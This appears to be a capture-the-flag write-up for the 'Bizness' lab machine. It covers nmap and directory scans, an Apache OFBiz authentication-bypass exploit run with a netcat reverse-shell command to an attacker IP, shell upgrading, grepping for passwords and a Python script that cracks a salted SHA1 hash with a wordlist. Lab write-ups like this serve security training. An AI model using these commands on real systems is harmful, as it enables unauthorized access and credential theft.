
Nmap Scanning:

~~~

nmap 10.129.248.54 -sC -sV 
~~~

~~~
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-08 18:16 IST
Nmap scan report for 10.129.248.54
Host is up (0.28s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp   open     http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp  open     ssl/http nginx 1.18.0
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: nginx/1.18.0
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-alpn: 
|_  http/1.1
|_http-title: Did not follow redirect to https://bizness.htb/
|_ssl-date: TLS randomness does not represent time
1277/tcp filtered miva-mqs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.42 seconds
~~~



![[Screenshot from 2024-01-08 18-17-48.png]]


Dir Enumeration:

~~~

dirsearch -u https://bizness.htb/
~~~

~~~

[18:21:50] Starting: 
[18:22:23] 400 -  795B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[18:22:26] 400 -  795B  - /a%5c.aspx
[18:22:29] 302 -    0B  - /accounting  ->  https://bizness.htb/accounting/
[18:23:14] 302 -    0B  - /catalog  ->  https://bizness.htb/catalog/
[18:23:21] 302 -    0B  - /common  ->  https://bizness.htb/common/
[18:23:21] 404 -  780B  - /common/config/api.ini
[18:23:21] 404 -  779B  - /common/config/db.ini
[18:23:21] 404 -  762B  - /common/
[18:23:25] 302 -    0B  - /content  ->  https://bizness.htb/content/
[18:23:25] 302 -    0B  - /content/  ->  https://bizness.htb/content/control/main
[18:23:25] 302 -    0B  - /content/debug.log  ->  https://bizness.htb/content/control/main
[18:23:27] 200 -   34KB - /control/
[18:23:28] 200 -   34KB - /control
[18:23:28] 200 -   11KB - /control/login
[18:23:31] 404 -  763B  - /default.html
[18:23:31] 404 -  741B  - /default.jsp
[18:23:38] 302 -    0B  - /error  ->  https://bizness.htb/error/
[18:23:38] 404 -  770B  - /error/error.log
[18:23:38] 404 -  761B  - /error/
[18:23:39] 302 -    0B  - /example  ->  https://bizness.htb/example/
[18:23:54] 404 -  768B  - /images/README
[18:23:54] 404 -  762B  - /images/
[18:23:54] 404 -  769B  - /images/c99.php
[18:23:54] 302 -    0B  - /images  ->  https://bizness.htb/images/
[18:23:54] 404 -  769B  - /images/Sym.php
[18:23:56] 302 -    0B  - /index.jsp  ->  https://bizness.htb/control/main
~~~

![[Pasted image 20240108182453.png]]

![[Pasted image 20240108182511.png]]

there is an CVE for OFBIZ
so we exploit with this 
https://www.vicarius.io/vsociety/posts/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-49070-and-cve-2023-51467

with cve we get the shell 

~~~
sudo python3 ex.py --url https://bizness.htb --cmd 'nc -e /bin/sh  10.**.**.** 1444'
~~~

![[Pasted image 20240108182840.png]]

~~~
nc -lvnp 1444
~~~

 with this command we got the 
 
 interactive  shell
 
~~~
python3 -c 'import pty; pty.spawn("/bin/bash")'
~~~

we get the user flag 
![[Pasted image 20240108183205.png]]

Root flag

![[Pasted image 20240108183509.png]]

a salt is a random sequence added to the plaintext password before using a one-way function to create a password hash. This process ensures that the same password will not produce the same hash value, as each user's password is hashed using a unique salt. The salt is typically stored alongside the hash. When you want to find the password from a hashed value, you need to use the same salt that was used to originally hash the password. This is why you need the salt to find the password.


so we need salt part of the password to decrypt


![[Pasted image 20240108185618.png]]

~~~
$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
~~~


~~~
grep -arin -o -E '(\w+\W+){0,5}password(\W+\w+){0,5}'
~~~

~~~
- `-a`: Treat binary files as text.
- `-r`: Recursively search subdirectories.
- `-i`: Perform case-insensitive matching.
- `-n`: Display line numbers.
- `-o`: Only display the matched parts of the line.
- `-E`: Use extended regular expressions.

The regular expression used is `(\w+\W+){0,5}password(\W+\w+){0,5}`:

- `(\w+\W+){0,5}`: Match 0 to 5 occurrences of one or more word characters followed by one or more non-word characters (essentially allowing for up to 5 words before "password").
- `password`: Match the literal word "password."
- `(\W+\w+){0,5}`: Match 0 to 5 occurrences of one or more non-word characters followed by one or more word characters (essentially allowing for up to 5 words after "password").
~~~


~~~ python

import hashlib
import base64
import os
def cryptBytes(hash_type, salt, value):
    if not hash_type:
        hash_type = "SHA"
    if not salt:
        salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
    hash_obj = hashlib.new(hash_type)
    hash_obj.update(salt.encode('utf-8'))
    hash_obj.update(value)
    hashed_bytes = hash_obj.digest()
    result = f"${hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}"
    return result
def getCryptedBytes(hash_type, salt, value):
    try:
        hash_obj = hashlib.new(hash_type)
        hash_obj.update(salt.encode('utf-8'))
        hash_obj.update(value)
        hashed_bytes = hash_obj.digest()
        return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')
    except hashlib.NoSuchAlgorithmException as e:
        raise Exception(f"Error while computing hash of type {hash_type}: {e}")
hash_type = "SHA1"
salt = "d"
search = "$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I="
wordlist = '/usr/share/wordlists/rockyou.txt'
with open(wordlist,'r',encoding='latin-1') as password_list:
    for password in password_list:
        value = password.strip()
        hashed_password = cryptBytes(hash_type, salt, value.encode('utf-8'))
        # print(hashed_password)
        if hashed_password == search:
            print(f'Found Password:{value}, hash:{hashed_password}')
  ~~~

	
we find the password  for root


~~~
Found Password:monkeybizness, hash:$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=
~~~

![[Pasted image 20240108190503.png]]

finally we got the root flag
